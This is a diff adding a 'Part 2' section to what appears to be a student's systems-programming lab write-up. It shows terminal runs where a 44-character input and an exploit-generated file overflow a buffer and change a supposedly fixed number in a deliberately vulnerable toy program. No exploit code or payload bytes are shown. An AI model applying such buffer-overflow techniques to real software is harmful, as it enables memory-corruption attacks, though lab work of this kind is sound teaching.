@@ -75,3 +75,20 @@ Enter code to disarm the trap:
 
 ## Part 2
 
+By giving an input of length 44, the constant value is changing:
+```bash
+ernurator@DESKTOP-T1TMEL5:/mnt/c/Users/isenb/projects/sys_prog_labs/Sys-Prog-Labs/lab3/buf$ ./buffer
+My favorite number is 12 and it will always be 12 and nothing can change that
+12345678901234567890123456789012345678901234
+My favorite number is 0 and it will always be 0 and nothing can change that
+Returned to main safe and sound
+```
+
+After changing the `exploit.c` file:
+```bash
+ernurator@DESKTOP-T1TMEL5:/mnt/c/Users/isenb/projects/sys_prog_labs/Sys-Prog-Labs/lab3/buf$ ./buffer < exploit1.txt
+My favorite number is 12 and it will always be 12 and nothing can change that
+My favorite number is 131 and it will always be 131 and nothing can change that
+Returned to main safe and sound
+```
+
